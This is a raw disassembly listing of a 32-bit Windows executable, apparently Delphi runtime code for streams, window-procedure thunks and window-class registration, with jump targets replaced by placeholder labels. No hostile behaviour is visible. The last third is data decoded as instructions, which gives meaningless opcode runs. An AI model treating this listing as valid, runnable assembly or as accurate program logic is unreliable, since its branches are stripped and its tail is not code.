mov cl 0x1
mov edx ebx
call sub_4213c0
inc edi
dec ebp
jne r-xdata
sub_421410
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404154
mov edx esp
mov eax esi
call sub_40343c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_421458
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421480
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4214dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031dc
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_42151c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_42153c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421560
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4215a8
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx esi
call sub_4217d8
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_421610
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_4217d8
mov edx ebx
mov eax esi
call sub_4217cc
sub_421654
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420d38
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_421698
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420d84
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_421038
jmp r-xdata
mov eax esi
call sub_4187e8
mov edx eax
mov eax edi
call sub_4217d8
lea eax [ edi + 0x50 ]
call sub_40d31c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
sub_4216f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_421054
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421724
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421740
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_42175c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_418700
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_4217d8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4185f0
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_418700
cmp ebp eax
jne r-xdata
sub_421818
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421038
mov edx ebx
call sub_420e08
sub_421844
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42188c
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403128
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4218c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421913
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_42192c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_42197b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421994
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4219fe
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421a18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421a61
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41ae6c
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421a7c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405828
xor eax eax
push ebp
push sub_421c69
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_421c42
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026cc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421c31
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421c70
lea eax [ ebp + 0xc ]
call sub_4057b4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4039a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421cac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_421d0f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421d40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418ac4
mov edi eax
xor eax eax
push ebp
push sub_421d95
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421d9c
mov eax [ rw-data ]
call sub_418b28
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418700
call sub_403128
inc esi
dec ebx
jne r-xdata
sub_421db4
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_421ddc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028c8
mov edx sub_421db4
lea eax [ esi + 0x5 ]
call sub_421dd4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_421dd4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_421e98
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406bb8
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421ddc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_421f4c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_421e74
sub_421f74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422018
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42201f
retn
mov eax [ rw-data ]
call sub_417ce8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421d40
xor edx edx
xor eax eax
call sub_41bdd0
mov eax rw-data
call sub_40d31c
call sub_405ee4
lea eax [ eax + 0xc ]
call sub_40d31c
mov eax rw-data
call sub_40d31c
mov eax rw-data
call sub_4057b4
mov eax sub_421dac
call sub_405650
mov eax rw-data
call sub_40d31c
call sub_420b58
mov eax rw-data
call sub_40d31c
mov eax rw-data
call sub_4057b4
sub_422024
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4220ad
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4220b4
retn
call sub_420b24
mov eax sub_421dac
call sub_405648
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d05c
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4057cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4175e4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41896c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41896c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4220b8
salc
dec eax
add [ edx + 0x640000ff ] cl
salc
dec eax
add [ ebx + 0x640000ff ] cl
salc
dec eax
add [ edi + edi * 8 - 0x299c0000 ] cl
dec eax
add [ ebp + 0x640000ff ] cl
salc
dec eax
add [ esi + 0x640000ff ] cl
salc
dec eax
add [ edi + 0x640000ff ] cl
salc
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] dh
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] bh
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] ah
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] ch
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] dl
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] bl
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] al
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
salc
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ edi + edi * 8 ] cl
add [ esi + edx * 8 + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
salc
dec eax
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] dh
salc
dec eax
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] bh
salc
dec eax
add [ esi ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] ah
salc
dec eax
add [ esi ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
salc
dec eax
add [ 0x640000ff ] ch
salc
dec eax
add [ esi ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + edx * 8 + 0x48 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422435
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42243c
retn
sub_422448
dec esp
and al 0x42
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
lodsb [ esi ]
and al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0xc0042 ] ch
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
and eax 0xc0042
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ 0x66090042 ] ah
jo r-xdata
outsb
je r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
